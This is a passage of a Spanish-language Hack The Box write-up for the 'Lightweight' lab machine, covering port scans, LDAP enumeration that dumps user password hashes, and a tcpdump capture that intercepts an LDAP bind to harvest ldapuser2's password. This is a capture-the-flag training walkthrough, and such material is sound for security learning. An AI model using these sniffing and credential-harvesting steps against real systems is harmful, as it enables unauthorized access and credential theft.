---
title: "HTB write-up: Lightweight"
date: 2019-05-10T01:32:41-05:00
description: ""
tags: ["hackthebox", "htb", "boot2root", "pentesting", ""]
categories: ["htb", "pentesting"]

---

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![lightweight image](https://www.hackthebox.eu/storage/avatars/6069dc9efc05cdf7ef0011efd817da9c_thumb.png) [lightweight](https://www.hackthebox.eu/home/machines/profile/166) | [0xEA31](https://www.hackthebox.eu/home/users/profile/13340) | Linux | 10.10.10.119 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-lightweight/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~#  nmap -sS -p- --open -v -n 10.10.10.119
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-23 22:42 CST
Initiating Ping Scan at 22:42
Scanning 10.10.10.119 [4 ports]
Completed Ping Scan at 22:42, 0.44s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:42
Scanning 10.10.10.119 [65535 ports]
Discovered open port 22/tcp on 10.10.10.119
Discovered open port 80/tcp on 10.10.10.119
Discovered open port 389/tcp on 10.10.10.119
Completed SYN Stealth Scan at 22:54, 771.75s elapsed (65535 total ports)
Nmap scan report for 10.10.10.119
Host is up (0.21s latency).
Not shown: 65532 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 772.33 seconds
           Raw packets sent: 261790 (11.519MB) | Rcvd: 786 (56.296KB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Continuemos con el doblecheck usando `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.119

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-15 06:33:48 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.119
Discovered open port 22/tcp on 10.10.10.119
Discovered open port 389/tcp on 10.10.10.119
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN

Como podemos ver, los puertos corresponden entre si, por lo que continuamos con la enumeración de servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sC -sV -p80,22,389 -n -v --open 10.10.10.119
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 22:45 CDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
Initiating Ping Scan at 22:45
Scanning 10.10.10.119 [4 ports]
Completed Ping Scan at 22:45, 1.87s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:45
Scanning 10.10.10.119 [3 ports]
Discovered open port 80/tcp on 10.10.10.119
Discovered open port 22/tcp on 10.10.10.119
Discovered open port 389/tcp on 10.10.10.119
Completed SYN Stealth Scan at 22:45, 2.08s elapsed (3 total ports)
Initiating Service scan at 22:45
Scanning 3 services on 10.10.10.119
Completed Service scan at 22:45, 19.11s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.119.
Initiating NSE at 22:45
Completed NSE at 22:46, 57.45s elapsed
Initiating NSE at 22:46
Completed NSE at 22:46, 0.00s elapsed
Nmap scan report for 10.10.10.119
Host is up (1.8s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Issuer: commonName=lightweight.htb
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-01-15T13:32:51
| Not valid after:  2019-01-15T13:32:51
| MD5:   0e61 1374 e591 83bd fd4a ee1a f448 547c
|_SHA-1: 8e10 be17 d435 e99d 3f93 9f40 c5d9 433c 47dd 532f
|_ssl-date: TLS randomness does not represent time

NSE: Script Post-scanning.
Initiating NSE at 22:46
Completed NSE at 22:46, 0.00s elapsed
Initiating NSE at 22:46
Completed NSE at 22:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.12 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```



# Enum of tcp/389 (ldap)

```text
xbytemx@laptop:~/htb/lightweight$ nmap --script ldap-search -p389 10.10.10.119
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-05 19:12 CST
Nmap scan report for 10.10.10.119
Host is up (0.19s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search:
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001

Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
```

Por los resultados podemos observar dos usuarios locales, ldapuser1 y ldapuser2. Los hashes de las contraseñas, se encuentran en bcrypt, por lo que ejecutar un brute force sobre los hashes nos tomaría demasiado tiempo. Detengamos hasta aquí las pruebas sobre el servicio y continuemos con HTTP.

# Enum tcp/80 (http)

```html
xbytemx@laptop:~/htb/lightweight$ http 10.10.10.119
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 4218
Content-Type: text/html; charset=UTF-8
Date: Wed, 15 May 2019 03:51:16 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16

<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Lightweight slider evaluation page - slendr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Roboto:100,300'>
  <link rel='stylesheet prefetch' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css'>
  <link rel="stylesheet" href="css/style.css">
</head>

<body>

<!-- github-ribbon -->
<a href="https://github.com/joseluisq/slendr" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:rgba(255,255,255,.75); color:#353a43; z-index:7; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out;}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
<!-- //github-ribbon -->

<div id="overlay" onclick="off()" style="display:block; z-index:100">
  <div id="text">This site is protected by against bruteforging.<br>
  <br><a href="info.php">info</a>&nbsp;&nbsp;<a href="status.php">status</a>&nbsp;&nbsp;<a href="user.php">user</a>
  </div>
</div>

<div style="padding:20px">
  <h2>Overlay with Text</h2>
  <button onclick="on()">Turn on overlay effect</button>
</div>

<script>
function on() {
    document.getElementById("overlay").style.display = "block";
}

function off() {
    document.getElementById("overlay").style.display = "none";
}
</script>

<div class="slendr">
  <nav class="slendr-direction">
    <a href="#" class="slendr-prev"><i class="fa fa-angle-left"></i></a>
    <a href="#" class="slendr-next"><i class="fa fa-angle-right"></i></a>
  </nav>

  <nav class="slendr-control">
    <p></p>
  </nav>

  <div class="slendr-slides">

    <section class="slendr-slide" data-src="https://c1.staticflickr.com/1/742/20508368953_9f318453e6_k.jpg">
      <div class="slider-content">
        <div class="slider-box">
          <h1>Slendr</h1>
          <p>
            Lightweight and responsive slider for modern browsers.
          </p>
        </div>
      </div>
    </section>

    <section class="slendr-slide" data-src="https://c1.staticflickr.com/1/587/21562390566_60f8c82957_k.jpg">
      <div class="slider-content">
        <div class="slider-box">
          <h1>Slendr</h1>
          <p>
            Lightweight and responsive slider for modern browsers.
          </p>
        </div>
      </div>
    </section>

    <section class="slendr-slide" data-src="https://c2.staticflickr.com/8/7281/16559230138_f00034ac65_h.jpg">
      <div class="slider-content">
        <div class="slider-box">
          <h1>Slendr</h1>
          <p>
            Lightweight and responsive slider for modern browsers.
          </p>
        </div>
      </div>
    </section>

  </div>
</div>
</body>
<script src='https://unpkg.com/slendr@1.2.2/dist/slendr.umd.js'></script>
<script src="js/index.js"></script>
</html>
```

![home](/img/htb-lightweight/www-home.png)

Podemos ver por el home, que tenemos referencias a archivos en PHP y que se trata de una aplicación de slides. Los archivos php que tienen referencia son: `info.php`, `status.php` y `user.php`.

Exploremos uno por uno para ver que encontramos.

1. info.php

![info](/img/htb-lightweight/www-info.png)

```html
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 1727
Content-Type: text/html; charset=UTF-8
Date: Mon, 08 Apr 2019 15:49:19 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16

<!DOCTYPE html>
<html lang="en" >


<head>
  <meta charset="UTF-8">
  <title>Lightweight slider evaluation page - slendr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Roboto:100,300'>
  <link rel='stylesheet prefetch' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css'>
  <link rel="stylesheet" href="css/style.css">
</head>

<body>

<div class="slider-content">
  <div class="slider-box">
  <h1>Info</h1>
  <p><br><br>As part of our SDLC, we need to validate a new proposed configuration for our front end servers with a penetration test.</p>
<p></p>
<p>Real pages have been removed and a fictionary content has been updated to the site. Any functionality to be tested has been integrated.</p>
<p></p>
<p>This server is protected against some kinds of threats, for instance, bruteforcing. If you try to bruteforce some of the exposed services you may be banned up to 5 minutes.</p>
<p></p>
<p>If you get banned it's your fault, so please do not reset the box and let other people do their work while you think a different approach.</p>
<p></p>
<p>A list of banned IP is avaiable <a href="status.php">here</a>. You may or may not be able to view it while you are banned.</p>
<p></p>
<p>If you like to get in the box, please go to the <a href="user.php">user</a> page.</p>
<p><br><br><a href="index.php">home</a>&nbsp;&nbsp;<a href="info.php">info</a>&nbsp;&nbsp;<a href="status.php">status</a>&nbsp;&nbsp;<a href="user.php">user</a></p>
  </div>
</div>
</body>
</html>
```

Info presenta unos mensajes bastante comunicativos. Nos indican que si realizamos un bruteforce al servicio HTTP, esta bloqueara la IP por 5 minutos. En esta pagina podemos ver las direcciones IP que actualmente se encuentran bloqueadas, que obviamente no podemos ver si estamos bloqueados.

2. user.php

![user](/img/htb-lightweight/www-user.png)

```html
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 1495
Content-Type: text/html; charset=UTF-8
Date: Mon, 08 Apr 2019 15:49:56 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16

<!DOCTYPE html>
<html lang="en" >


<head>
  <meta charset="UTF-8">
  <title>Lightweight slider evaluation page - slendr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Roboto:100,300'>
  <link rel='stylesheet prefetch' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css'>
  <link rel="stylesheet" href="css/style.css">
</head>

<body>

<div class="slider-content">
  <div class="slider-box">
  <h1>Your account</h1>
  <p><br><br>If you did not read the info page, please go <a href="info.php">there</a> the and read it carefully.</p>
  <p></p>
  <p>This server lets you get in with ssh. Your IP (10.10.14.249) is automatically added as userid and password within a minute of your first http page request. We strongly suggest you to change your password as soon as you get in the box.</p>
  <p></p>
  <p>If you need to reset your account for whatever reason, please click <a href="reset.php">here</a> and wait (up to) a minute. Your account will be deleted and added again. Any file in your home directory will be deleted too.</p>
  <p></p>
  <p><br><br><a href="index.php">home</a>&nbsp;&nbsp;<a href="info.php">info</a>&nbsp;&nbsp;<a href="status.php">status</a>&nbsp;&nbsp;<a href="user.php">user</a></p>
  </div>
</div>
</body>
</html>
```

En user, tenemos una notificación al ingresar sobre un acceso que se nos ha otorgado de manera automática al visitar la pagina. Este acceso es vía SSH usando nuestra dirección IP como usuario y contraseña.

También aparece un nuevo enlace, el de reset.php. Este enlace nos sirve para ejecutar la baja y alta automática de nuestra cuenta, donde su proceso nos deja un home fresco.

3. status.php

![status](/img/htb-lightweight/www-status.png)

```html
xbytemx@laptop:~/htb/lightweight$ http http://10.10.10.119/status.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 1052
Content-Type: text/html; charset=UTF-8
Date: Mon, 08 Apr 2019 23:06:47 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16

<!DOCTYPE html>
<html lang="en" >


<head>
  <meta charset="UTF-8">
  <title>Lightweight slider evaluation page - slendr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Roboto:100,300'>
  <link rel='stylesheet prefetch' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css'>
  <link rel="stylesheet" href="css/style.css">
</head>

<body>

<div class="slider-content">
<div class="slider-box">
<h1>List of banned IPs</h1>

<p><i>You may or may not see this page when you are banned. </i><br><br>
<p><i>This page has been generated at 2019/04/09 00:07:07. Data is refreshed every minute.</i>
</p>
<p></p>
<p><br><br><a href="index.php">home</a>&nbsp;&nbsp;<a href="info.php">info</a>&nbsp;&nbsp;<a href="status.php">status</a>&nbsp;&nbsp;<a href="user.php">user</a></p>
 </div>
</div>
</body>
</html>
```

En status podremos ver las direcciones baneadas actualmente, así como la ultima fecha que este reporte fue generado.

Con los elementos actualmente descubiertos y analizando su interacción, info es puramente estático, mientras que reset, status y user, generan alguna acción en el backend para proveernos información. Ejemplo:

* Cuando visite user, alguna función tomo mi dirección y procedió a dar el alta en el back.
* Cuando visite status, se debió consultar algún punto que tenga esta información
* Finalmente con reset, aunque no lo ejecute, su descripción es clara. Hay un proceso de baja y alta de usuarios.

Ahora, entremos por SSH a la maquina para seguir investigando.

# Enum ssh restricted env

Después de usar a user.php, entramos directamente a la maquina solo para encontrarnos que no hay nada realmente útil:

```text
xbytemx@laptop:~/htb/lightweight$ ssh 10.10.14.36@10.10.10.119
10.10.14.36@10.10.10.119's password:
[10.10.14.36@lightweight ~]$
[10.10.14.36@lightweight ~]$ ps -fea
UID        PID  PPID  C STIME TTY          TIME CMD
10.10.1+ 14195 14194  0 05:24 pts/0    00:00:00 -bash
10.10.1+ 14233 14195  0 05:24 pts/0    00:00:00 ps -fea
[10.10.14.36@lightweight ~]$ id
uid=1010(10.10.14.36) gid=1010(10.10.14.36) grupos=1010(10.10.14.36) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[10.10.14.36@lightweight ~]$ ls -lah
total 12K
drwx------.  4 10.10.14.36 10.10.14.36  91 may 19 05:24 .
drwxr-xr-x. 12 root        root        195 may 19 05:24 ..
-rw-r--r--.  1 10.10.14.36 10.10.14.36  18 abr 11  2018 .bash_logout
-rw-r--r--.  1 10.10.14.36 10.10.14.36 193 abr 11  2018 .bash_profile
-rw-r--r--.  1 10.10.14.36 10.10.14.36 246 jun 15  2018 .bashrc
drwxrwxr-x.  3 10.10.14.36 10.10.14.36  18 may 19 05:24 .cache
drwxrwxr-x.  3 10.10.14.36 10.10.14.36  18 may 19 05:24 .config
[10.10.14.36@lightweight ~]$ ls ../
10.10.14.197  10.10.14.2  10.10.14.36  10.10.15.193  10.10.15.213  10.10.15.71  10.10.16.119  10.10.17.22  ldapuser1  ldapuser2
[10.10.14.36@lightweight ~]$ ls ../ldapuser*
ls: no se puede abrir el directorio ../ldapuser1: Permiso denegado
ls: no se puede abrir el directorio ../ldapuser2: Permiso denegado
```

# Intercepting local ldap queries

Seguí investigando pero no encontré nada realmente de valor hasta que recibí un hit. El camino que había seguido en describir la aplicación tenia lagunas, porque a modo descriptivo sabia que hacían las paginas, pero no como. Entonces si no puedo leer al emisor o al receptor, puedo tratar de leer el medio. Aquí es donde aunque parece sacado de la manga, pase muchas horas tratando de entender como poder llegar a ldapuser1 o ldapuser2.

Después de entender eso y probar varios filtros, logre capturar lo siguiente mientras visitaba status.php (por cierto, esta pagina me dio mala espina desde que era la única que tardaba mucho, como si de alguna tarea se tratase):

```text
[10.10.14.151@lightweight ~]$ tcpdump -i any -XX -vv 'tcp port 389'
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
00:07:07.973705 IP (tos 0x0, ttl 64, id 49718, offset 0, flags [DF], proto TCP (6), length 60)
    lightweight.htb.37972 > lightweight.htb.ldap: Flags [S], cksum 0x2930 (incorrect -> 0x19de), seq 4118891294, win 43690, options [mss 65495,sackOK,TS val 11634984 ecr 0,nop,wscale 6], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 003c c236 4000 4006 4f84 0a0a 0a77  E..<.6@.@.O....w
	0x0020:  0a0a 0a77 9454 0185 f581 4b1e 0000 0000  ...w.T....K.....
	0x0030:  a002 aaaa 2930 0000 0204 ffd7 0402 080a  ....)0..........
	0x0040:  00b1 8928 0000 0000 0103 0306 0100 0400  ...(............
	0x0050:  0400 0000 0000 0000 0000 0000            ............
00:07:07.973762 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    lightweight.htb.ldap > lightweight.htb.37972: Flags [S.], cksum 0x2930 (incorrect -> 0x3ae4), seq 3241251805, ack 4118891295, win 43690, options [mss 65495,sackOK,TS val 11634984 ecr 11634984,nop,wscale 6], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 003c 0000 4000 4006 11bb 0a0a 0a77  E..<..@.@......w
	0x0020:  0a0a 0a77 0185 9454 c131 93dd f581 4b1f  ...w...T.1....K.
	0x0030:  a012 aaaa 2930 0000 0204 ffd7 0402 080a  ....)0..........
	0x0040:  00b1 8928 00b1 8928 0103 0306 0000 0000  ...(...(........
	0x0050:  0000 0000 0000 0000 0000 0000            ............
00:07:07.973805 IP (tos 0x0, ttl 64, id 49719, offset 0, flags [DF], proto TCP (6), length 52)
    lightweight.htb.37972 > lightweight.htb.ldap: Flags [.], cksum 0x2928 (incorrect -> 0x0bd3), seq 1, ack 1, win 683, options [nop,nop,TS val 11634984 ecr 11634984], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 0034 c237 4000 4006 4f8b 0a0a 0a77  E..4.7@.@.O....w
	0x0020:  0a0a 0a77 9454 0185 f581 4b1f c131 93de  ...w.T....K..1..
	0x0030:  8010 02ab 2928 0000 0101 080a 00b1 8928  ....)(.........(
	0x0040:  00b1 8928 faba 0a59 0103 0306 0103 042d  ...(...Y.......-
	0x0050:  7569 643d                                uid=
00:07:07.973929 IP (tos 0x0, ttl 64, id 49720, offset 0, flags [DF], proto TCP (6), length 143)
    lightweight.htb.37972 > lightweight.htb.ldap: Flags [P.], cksum 0x2983 (incorrect -> 0xb2b3), seq 1:92, ack 1, win 683, options [nop,nop,TS val 11634984 ecr 11634984], length 91
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 008f c238 4000 4006 4f2f 0a0a 0a77  E....8@.@.O/...w
	0x0020:  0a0a 0a77 9454 0185 f581 4b1f c131 93de  ...w.T....K..1..
	0x0030:  8018 02ab 2983 0000 0101 080a 00b1 8928  ....)..........(
	0x0040:  00b1 8928 3059 0201 0160 5402 0103 042d  ...(0Y...`T....-
	0x0050:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
	0x0060:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
	0x0070:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
	0x0080:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
	0x0090:  3130 3564 3365 3533 6164 3339 6163 3200  105d3e53ad39ac2.
	0x00a0:  0000 0000 0000 0000 0000 0000 0000 00    ...............
00:07:07.973956 IP (tos 0x0, ttl 64, id 6902, offset 0, flags [DF], proto TCP (6), length 52)
    lightweight.htb.ldap > lightweight.htb.37972: Flags [.], cksum 0x2928 (incorrect -> 0x0b78), seq 1, ack 92, win 683, options [nop,nop,TS val 11634984 ecr 11634984], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 0034 1af6 4000 4006 f6cc 0a0a 0a77  E..4..@.@......w
	0x0020:  0a0a 0a77 0185 9454 c131 93de f581 4b7a  ...w...T.1....Kz
	0x0030:  8010 02ab 2928 0000 0101 080a 00b1 8928  ....)(.........(
	0x0040:  00b1 8928 fab9 df09 0103 0306 0100 0400  ...(............
	0x0050:  0400 0000                                ....
00:07:07.998689 IP (tos 0x0, ttl 64, id 6903, offset 0, flags [DF], proto TCP (6), length 66)
    lightweight.htb.ldap > lightweight.htb.37972: Flags [P.], cksum 0x2936 (incorrect -> 0xc7d0), seq 1:15, ack 92, win 683, options [nop,nop,TS val 11635009 ecr 11634984], length 14
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 0042 1af7 4000 4006 f6bd 0a0a 0a77  E..B..@.@......w
	0x0020:  0a0a 0a77 0185 9454 c131 93de f581 4b7a  ...w...T.1....Kz
	0x0030:  8018 02ab 2936 0000 0101 080a 00b1 8941  ....)6.........A
	0x0040:  00b1 8928 300c 0201 0161 070a 0100 0400  ...(0....a......
	0x0050:  0400 2404 000a 0100 0a01 0002 0100 0201  ..$.............
	0x0060:  6401                                     d.
00:07:07.998730 IP (tos 0x0, ttl 64, id 49721, offset 0, flags [DF], proto TCP (6), length 52)
    lightweight.htb.37972 > lightweight.htb.ldap: Flags [.], cksum 0x2928 (incorrect -> 0x0b38), seq 92, ack 15, win 683, options [nop,nop,TS val 11635009 ecr 11635009], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 0034 c239 4000 4006 4f89 0a0a 0a77  E..4.9@.@.O....w
	0x0020:  0a0a 0a77 9454 0185 f581 4b7a c131 93ec  ...w.T....Kz.1..
	0x0030:  8010 02ab 2928 0000 0101 080a 00b1 8941  ....)(.........A
	0x0040:  00b1 8941 3030 0201 0764 2b04 0030 2730  ...A00...d+..0'0
	0x0050:  2504 0b6f                                %..o
00:07:08.001510 IP (tos 0x0, ttl 64, id 49722, offset 0, flags [DF], proto TCP (6), length 59)
    lightweight.htb.37972 > lightweight.htb.ldap: Flags [P.], cksum 0x292f (incorrect -> 0xd6dd), seq 92:99, ack 15, win 683, options [nop,nop,TS val 11635012 ecr 11635009], length 7
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 003b c23a 4000 4006 4f81 0a0a 0a77  E..;.:@.@.O....w
	0x0020:  0a0a 0a77 9454 0185 f581 4b7a c131 93ec  ...w.T....Kz.1..
	0x0030:  8018 02ab 292f 0000 0101 080a 00b1 8944  ....)/.........D
	0x0040:  00b1 8941 3005 0201 0242 0006 0000 0000  ...A0....B......
	0x0050:  0000 0000 0000 0000 0000 00              ...........
00:07:08.001558 IP (tos 0x0, ttl 64, id 49723, offset 0, flags [DF], proto TCP (6), length 52)
    lightweight.htb.37972 > lightweight.htb.ldap: Flags [F.], cksum 0x2928 (incorrect -> 0x0b2d), seq 99, ack 15, win 683, options [nop,nop,TS val 11635012 ecr 11635009], length 0
	0x0000:  0000 0304 0006 0000 0000 0000 0000 0800  ................
	0x0010:  4500 0034 c23b 4000 4006 4f87 0a0a 0a77  E..4.;@.@.O....w
	0x0020:  0a0a 0a77 9454 0185 f581 4b81 c131 93ec  ...w.T....K..1..
	0x0030:  8011 02ab 2928 0000 0101 080a 00b1 8944  ....)(.........D
	0x0040:  00b1 8941 00b1 8928 0103 0306 0100 0400  ...A...(........
	0x0050:  0400 0000                                ....
00:07:08.003363 IP (tos 0x0, ttl 64, id 6904, offset 0, flags [DF], proto TCP (6), length 52)
